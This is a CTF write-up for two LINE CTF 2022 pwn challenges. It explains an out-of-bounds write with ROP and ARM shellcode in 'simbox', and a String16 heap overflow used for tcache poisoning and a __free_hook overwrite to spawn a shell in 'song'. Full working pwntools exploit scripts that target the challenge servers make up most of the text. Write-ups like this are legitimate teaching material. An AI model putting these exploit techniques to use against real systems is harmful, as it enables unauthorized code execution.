---
title: "2022 linectf writeup"
date: 2022-03-27T18:00:00+09:00
summary: "pwn - simbox, song"
categories:
  - ctf-writeups
---

Played as a `donkey` :)

## simbox

First, there is no parameter index check in simbox's parse_url function, so oob write is possible.

Binary is emulated in arm-run.  In emulating, the permission setting of each segment is ignored. That is, writing is possible in the code segment, etc.

The first thing to do is to overwrite the stack via oob and do a ROP. Call the read function via ROP, overwriting arbitrary code regions with shellcode.

After that, it's a bypass of the filtering added to the ReadFileName function, but...

```c
  while ( 1 )
  {
    v9 = v6 + v7++;
    Byte = ARMul_SafeReadByte(state, v9);
    *(v7 - 1) = Byte;
    if ( !Byte )
      break;
    if ( v7 == v5 )
    {
      *OSptr = cb_host_to_target_errno(sim_callback, 36);
      result = 0xFFFFFFFFLL;
      state->Reg[0] = -1;
      return result;
    }
  }
  if ( strstr(buf, "flag") || (v12 = strstr(buf, "simbox"), result = 0LL, v12) )
  {
    *OSptr = cb_host_to_target_errno(sim_callback, 36);
    result = 0LL;
    state->Reg[0] = -1;
  }
```

Since result is not set to -1, ReadFileName is treated as a normal termination. That means the filtering doesn't work.

So just read the flags.

```python
from pwn import *

p = remote('35.243.120.147', 10007)
#p = process(['./arm-run','./simbox'])

pay = 'http://a.com/qwer?'
for i in range(73):
  pay += 'list=&'

pay += 'list=79&'

mov_r1_r5_pop_r4_r5_pc = 0x00012e38
pop_r0_pc = 0x000135f0
svc_pop_r4_r5_pc = 0x9E60

rop = [
  pop_r0_pc, 
  0,
  0x6, # r0 => read
  mov_r1_r5_pop_r4_r5_pc,
  0, # r4
  0x24424, # r5
  mov_r1_r5_pop_r4_r5_pc, # r1 = r5
  0, # r4
  0, # r5
  svc_pop_r4_r5_pc, # read,
  0,
  0,
  0x120B0
] 
for r in rop:
  pay += 'list=' + str(r) + '&'

print(pay)
pause()
p.sendafter('> \n', pay)
#p.send(pay)
context.log_level='debug'

code = '''
mov r0, 0
mov r1, 0x10000
mov r2, 0x20
svc 0x6a

mov r0, 0x10000
mov r1, 0
svc 0x66

mov r0, 3
mov r1, 0x10000
mov r2, 0x600
svc 0x6a

mov r0, 1
mov r1, 0x10000
mov r2, 0x600
svc 0x69

svc 0x11
'''

code = "\x00\x00\xa0\xe3\x01\x18\xa0\xe3\x20\x20\xa0\xe3\x6a\x00\x00\xef\x01\x08\xa0\xe3\x00\x10\xa0\xe3\x66\x00\x00\xef\x03\x00\xa0\xe3\x01\x18\xa0\xe3\x06\x2c\xa0\xe3\x6a\x00\x00\xef\x01\x00\xa0\xe3\x01\x18\xa0\xe3\x06\x2c\xa0\xe3\x69\x00\x00\xef\x11\x00\x00\xef"

#p.recvuntil('pc: 9e60, instr: ef123456')
p.recvuntil('parameter[91]:')
p.recvline()
p.send(code)
pause()
p.send('/home/simbox/flag\x00')


p.interactive()
```


## song

The crash was found through honggfuzz.

Crash points out the vulnerability here.

```c
else if (encoding == 0x02) {
  int len = n / 2;
  const char16_t *framedata = (const char16_t *)(frameData + 1);
  char16_t *framedatacopy = NULL;
  if (len > 0) {
    framedatacopy = new (std::nothrow) char16_t[len];
    if (framedatacopy == NULL) {
      return false;
    }
    for (int i = 0; i < len; i++) {
      framedatacopy[i] = bswap_16(framedata[i]);
    }
    framedata = framedatacopy;
  }
  featuring->setTo(framedata, len);
  if (framedatacopy != NULL) {
    delete[] framedatacopy;
  }
}
```
But vulnerabilities are not immediately visible. So I started digging into String8.cpp, String16.cpp.

and... i found 1-day. [https://bugs.chromium.org/p/project-zero/issues/detail?id=840](https://bugs.chromium.org/p/project-zero/issues/detail?id=840)

Now that you've got a heap overflow of any size, heap tricks' turn.

Proceeds with [chunk overlapping](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/overlapping_chunks.c) through overflow.

We can put it in unsorted bin up to the ALBUM area by overlapping.

After that, Reduce the size of the unsorted bin by alloc 0x5a0. Through this operation, the main_arena address is written in the ALBUM area, so it is possible to libc leak.

If you've even done libc leak, it's simple after that. Write a value to fd of tcache that has been freed through heap overflow, and get a arbitrary address write :)

brute-forcing free_hook and system addresses until utf8 valid (all address bytes <= 80).

The exploit is not optimized. Sorry :(

```python
from pwn import *
import random


libc = ELF('./libc-2.31.so')#ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
#context.log_level='error'
def overflow(payload, length):
  return b'\xd8\x41\xd8\x41\xdc\x41'*length + payload

def a(a1):
  return ((0xE5000000 >> ((a1 >> 3) & 0x1E)) & 3) + 1

def utf16(string, b=0):
  r = b''
  if b == 0:
    for i in string:
      r += b'\x00' + bytes([ord(i)])
    return r
  else:
    '''
    for i in string:
      if i <= 0x7f:
        r += b'\x00' + bytes([i])
      elif 0x80 <= i <= 0xbf:
        r += b'\xc2' + bytes([i])
      elif 0xc0 <= i:
        r += b'\xc3' + bytes([i])
    
    k = process('./src/a')
    k.send(string)
    r = k.recvline()[:-1]
    print(hexdump(r))
    k.close()
    d = b''
    for i in range(0, len(r), 2):
      d += r[i:i+2][::-1]
    return d
    '''
    for i in string:
      r += b'\x00' + bytes([i])
    return r
cnt = 0
while True:
  try:
    print(cnt)
    cnt += 1
    p = remote('34.146.137.124', 10008)
    #p = process('./song')

    pay = b'<TAG>'
    pay += b'<TITLE>' + p16(1) + p8(0) + b'a' + b'</TITLE>' 
    pay += b'<SINGER>' + p16(1) + p8(0xf) + b'b' + b'</SINGER>' 
    pay += b'<ALBUM>' + p16(1) + p8(0) + b'c' + b'</ALBUM>'
    pay += b'<FEATURING>' + p16(1) + p8(0xf) + b'd' + b'</FEATURING>' 
    pay += b'</TAG>'

    pay += b'\x00' * (0x10000 - len(pay))

    p.send(pay)
    p.recvuntil('featuring:')
    pay = b'<TAG>'
    pay += b'<TITLE>' + p16(0x80 - 8 - 1) + p8(0) + b'c2w2m2!@' + b'a'*(0x80 - 8 - 1 - 8) + b'</TITLE>' 
    pay += b'<SINGER>' + p16(0x500 - 8) + p8(0) + b'c3w3m3!@'+b'b'*(0x500-8-8) + b'</SINGER>' 
    pay += b'<ALBUM>' + p16(0x80 - 8 - 1) + p8(0) + b'c4w4m4!@'+b'c'*(0x80 - 8 - 1-8 -7) + b'\x30\x06\x00\x00\x00\x00\x00' + b'</ALBUM>' 
    pay += b'<FEATURING>' + p16(0x60) + p8(0) + b'd'*0x60 + b'</FEATURING>'
    pay += b'</TAG>'

    pay += b'\x00' * (0x10000 - len(pay))

    p.send(pay)
    p.recvuntil('featuring:')

    payload = utf16('a') * (0x78 - 1 - 0x18 - 24 - 8 - 8)  + utf16('\x00') * 7 + utf16('\x00\x31\x06\x00\x00\x00\x00\x00\x00') + utf16('f') * 7 + utf16('\x00') * 8 + utf16('\x00')*8
    l = 0x150
    d = b'\x00\x00' + overflow(payload, l) 

    pay = b'<TAG>'
    pay += b'<TITLE>' + p16(1) + p8(0) + b'a' + b'</TITLE>' 
    pay += b'<SINGER>' + p16(len(d)) + p8(2) + d + b'</SINGER>' 
    pay += b'<ALBUM>' + p16(1) + p8(0xf) + b'b' + b'</ALBUM>'
    pay += b'<FEATURING>' + p16(0x5a0 - 1 - 0x18) + p8(0) + b'd'*(0x5a0 - 1 - 0x18) + b'</FEATURING>'
    pay += b'</TAG>'
    pay += b'\x00' * (0x10000 - len(pay))

    p.send(pay)

    p.recvuntil('album: ')
    leak = u64(p.recv(6).ljust(8, b'\x00'))
    libcbase = leak - 0x1ebc50 - 0x1000
    log.info('[LIBC] 0x%x' % libcbase)
    print('0x%x' % (libcbase + libc.symbols['__free_hook']))
    print('0x%x' % (libcbase + 0x51D00))

    r = p64(libcbase + libc.symbols['__free_hook'] - 0x18)
    for i in r:
      if i >= 0x80:
        raise ValueError
    r = p64(libcbase + 0x51D00)
    for i in r:
      if i >= 0x80:
        raise ValueError
    k = utf16(p64(libcbase + libc.symbols['__free_hook'] - 0x18), b=1)
    payload = utf16('a') * (0x80 - 0x18 - 1 - 8 - 8 ) +utf16('b') + k
    l = 0x8
    d = overflow(payload, l)


    pay = b'<TAG>'
    pay += b'<TITLE>' + p16(len(d)) + p8(2) + d + b'</TITLE>' 
    pay += b'<SINGER>' + p16(0x40 - 1) + p8(0) + b'b'*(0x40-1) + b'</SINGER>' 
    pay += b'<ALBUM>' + p16(0x40 -1) + p8(0) + b'a'*(0x40-1) + b'</ALBUM>'
    pay += b'<FEATURING>' + p16(0x40-1) + p8(0) + b'd'*(0x40-1) + b'</FEATURING>' 
    pay += b'</TAG>'

    pay += b'\x00' * (0x10000 - len(pay))
    p.send(pay)

    pay = b'<TAG>'
    pay += b'<TITLE>' + p16(0x80) + p8(0) + b'a'*0x80 + b'</TITLE>' 
    pay += b'<SINGER>' + p16(0x80) + p8(0) + b'a'*0x80+ b'</SINGER>' 
    pay += b'<ALBUM>' + p16(0x80) + p8(0) + b'a'*0x80  + b'</ALBUM>' 
    pay += b'<FEATURING>' + p16(0x80) + p8(0) + b'a'*0x80 + b'</FEATURING>'
    pay += b'</TAG>'

    pay += b'\x00' * (0x10000 - len(pay))

    p.send(pay)

    payload = utf16('a') * (0x60 - 0x18 - 1 - 8 - 8 ) +utf16('b') + k
    l = 0x8
    d = overflow(payload, l) 


    pay2 = utf16(p64(libcbase + 0x51D00), b=1)
    pay2 += utf16('a') * (0x40 - 0x18 - 8)
    pay = b'<TAG>'
    pay += b'<TITLE>' + p16(len(d)) + p8(2) + d + b'</TITLE>' 
    pay += b'<SINGER>' + p16(0x40-1) + p8(0) + b'/bin/sh;' + b'a'*(0x40-8-1)+ b'</SINGER>' 
    pay += b'<ALBUM>' + p16(len(pay2)) + p8(2) + pay2 + b'</ALBUM>'
    pay += b'<FEATURING>' + p16(0x80) + p8(0xf) +b'/bin/sh\x00'+ b'a'*0x78 + b'</FEATURING>'
    pay += b'</TAG>'

    pay += b'\x00' * (0x10000 - len(pay))

    p.send(pay)
    pause()

    pay = b'<TAG>'
    pay += b'<TITLE>' + p16(0x80) + p8(0xf) + b'a'*0x80 + b'</TITLE>'
    pay += b'<SINGER>' + p16(0x80) + p8(0xf) + b'a'*0x80+ b'</SINGER>' 
    pay += b'<ALBUM>' + p16(0x80) + p8(0xf) + b'a'*0x80  + b'</ALBUM>' 
    pay += b'<FEATURING>' + p16(0x80) + p8(0xf) + b'a'*0x80 + b'</FEATURING>'
    pay += b'</TAG>'

    pay += b'\x00' * (0x10000 - len(pay))
    pause()
    p.send(pay)

    context.log_level='debug'

    p.interactive()
    exit(1)
  except ValueError as e:
    print(e)
    p.close()
```

